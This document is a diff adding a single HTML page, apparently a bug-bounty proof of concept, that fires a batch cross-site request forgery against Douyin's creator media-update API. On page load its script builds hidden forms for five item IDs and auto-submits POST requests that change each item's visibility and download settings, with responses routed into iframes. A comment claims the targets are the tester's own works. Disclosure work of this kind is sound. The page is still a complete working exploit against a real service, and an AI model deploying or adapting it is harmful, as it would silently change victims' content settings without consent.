@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CSRF batch PoC — single page, N writes</title></head>
+<body>
+<h3>Batch CSRF PoC (single page load, multiple writes)</h3>
+<pre id="out">submitting...</pre>
+<div id="frames"></div>
+<script>
+// Test items are the tester's OWN public works. Reverted immediately after evidence capture.
+const items = [
+  "7708349646759055857",
+  "7707630147873444593",
+  "7707285915853781105",
+  "7705797933912817009",
+  "7705733384739849893"
+];
+const q = new URLSearchParams(location.search);
+const vis = q.get("v") || "2";
+const framesDiv = document.getElementById("frames");
+let done = 0;
+items.forEach((itemId, idx) => {
+  const iframe = document.createElement("iframe");
+  iframe.name = "f_" + idx;
+  iframe.style.width = "300px"; iframe.style.height = "60px";
+  framesDiv.appendChild(iframe);
+  const form = document.createElement("form");
+  form.method = "POST";
+  form.action = "https://creator.douyin.com/web/api/media/aweme/update/?aid=1128";
+  form.target = "f_" + idx;            // response lands in iframe (opaque cross-origin, write still executes)
+  form.enctype = "application/x-www-form-urlencoded";
+  [["item_id", itemId], ["download", "1"], ["visibility_type", vis], ["xg_user_id", "0"], ["dx_upgraded", "0"]]
+    .forEach(([k, v]) => {
+      const inp = document.createElement("input");
+      inp.type = "hidden"; inp.name = k; inp.value = v;
+      form.appendChild(inp);
+    });
+  document.body.appendChild(form);
+  iframe.onload = () => { done++; document.getElementById("out").textContent = `submitted ${done}/${items.length}`; };
+  form.submit();
+});
+</script>
+</body>
+</html>
